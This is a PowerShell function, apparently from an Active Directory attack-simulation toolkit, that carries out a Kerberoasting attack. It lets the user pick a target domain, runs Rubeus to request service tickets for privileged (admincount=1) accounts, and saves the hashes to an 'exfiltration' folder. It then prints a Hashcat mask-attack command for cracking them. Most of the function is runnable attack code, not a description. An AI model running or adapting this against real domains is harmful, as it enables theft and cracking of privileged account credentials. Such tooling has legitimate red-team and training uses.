function Start-KerberoastingAttack {

    ################################################################################
    ######                                                                     #####
    ######                Kerberoasting Attack                                 #####
    ######                                                                     ##### 
    ######     technique used by attackers, which allows them to request       #####
    ######     a service ticket for any service with a registered SPN          #####
    ######                                                                     #####
    ################################################################################

    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host #####################

    $dnsdomain = $env:USERDNSDOMAIN
    $bestdc = $Script:BestDCs[$dnsdomain]
    $hashes = Join-Path -Path $Script:DefautExfiltrationFolder -ChildPath "KR-$dnsdomain.hashes.txt"

    # example: .\Rubeus.exe kerberoast /domain:SANDBOX.CORP /outfile:.\SANDBOX.CORP.hashes.txt
    
    Invoke-Output -Type CodeSnippet -Message "Command:"
    Write-Highlight -Text "  .\Rubeus.exe ", "kerberoast ", "/domain:", "$dnsdomain", " /dc:", "$bestdc", " /outfile:", "$hashes" `
        -Color $fgcC, $fgcF, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV

    $Title = "Kerberoasting Attack - Select Target Domain"
    $message = "Choose the domain that should be used for Kerberoasting."

    $Options = @(
        [pscustomobject] @{ Label = "Current &User Domain"; Help = "Use the DNS domain of the current user context, which is '$dnsdomain'."; Value = "DnsDomain" },
        [pscustomobject] @{ Label = "Specific &Domain"; Help = "Select a specific domain from the available forest/domain scope."; Value = "NewDomain" },
        [pscustomobject] @{ Label = "&Skip"; Help = "Skip the Kerberoasting attack."; Value = "Skip" }
    )
    
    $Decision = Show-DecisionPrompt -Message $message  -Options $Options -Default 0 -Title $Title

    If ($Decision -eq "NewDomain") {
        $dn = Select-ADObject -DomainSelectionOnly -Title "Select Domain for Kerberoasting Attack"
        $CN = Convert-FromDNToCN -DistinguishedName $dn
        $dnsdomain = $CN.Split('/')[0]
    }
    elseif ($Decision -eq "DnsDomain") {
        $dnsdomain = $env:USERDNSDOMAIN
    }
    else {
        return
    }

    $bestdc = $Script:BestDCs[$dnsdomain]
    $hashes = Join-Path -Path $Script:DefautExfiltrationFolder -ChildPath "KR-$dnsdomain.hashes.txt"

    If ($Decision -ne "Skip") {

        if (Test-Path $hashes) { Remove-Item $hashes }
        
        Invoke-Command -ScriptBlock {
            param($rubeusPath, $domain, $bestdc, $outfile)
            & $rubeusPath kerberoast /ldapfilter:'admincount=1' /domain:$domain /dc:$bestdc /outfile:$outfile
        } -ArgumentList "$($Script:ASTools)\Rubeus.exe", $dnsdomain, $bestdc, $hashes

        Write-Log -Message "     >> Invokeed Command: $($Script:ASTools)\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /domain:$dnsdomain /dc:$bestdc /outfile:$hashes"

        if (Test-Path $hashes) {
            Invoke-Item $hashes
            Write-Host ""
            Invoke-output -Type Success -Message "Roasted hashes were successfully generated for the domain '$dnsdomain'." -NoExtraLines 
        
            If ($UnAttended) { Start-Sleep 2 } else { Pause }

            $message = @"
The next step is to crack the roasted hashes using Hashcat.
    In this example, the password policy is known, so a brute-force or mask attack can be used.
    The Hashcat mode for Kerberos 5 TGS-REP hashes is 13100.
"@     
            #Invoke-Output -T Info -M $message

            Write-Host "`n"
            write-host "  [i] The next step is to " -NoNewline; write-host "crack " -NoNewline -ForegroundColor $fgcH 
            Write-Host "the roasted hashes."
            Write-host "      Hashcat is commonly used for this purpose and is a good choice for Kerberos hash cracking."
            Write-Host "      In this example, the password policy is known, so a brute-force or mask attack can be used." 
            Write-Host "      The Hashcat mode for Kerberos 5 TGS-REP hashes is 13100.`n"
            
            #https://medium.com/geekculture/hashcat-cheat-sheet-511ce5dd7857
            # example: .\hashcat.exe -a 3 -m 13000 ./SANDBOX.CORP.hashes.txt ?u?l?l?l?l?l?d?d
            Write-Host      -NoNewline "      Example: "
            Write-Highlight -Text ".\hashcat.exe ", "-a ", "3", " -m ", "13100 ", "./$hashes ", "?u?l?l?l?l?l?d?d" `
                -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcV, $fgcF
            Write-Host "`n"

        }
        else {
            Invoke-Output -Type Warning -Message "No results returned by LDAP, chose a different domain."
        }

        #If ($UnAttended) { Start-Sleep 2 } else { Pause }
    }


    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}
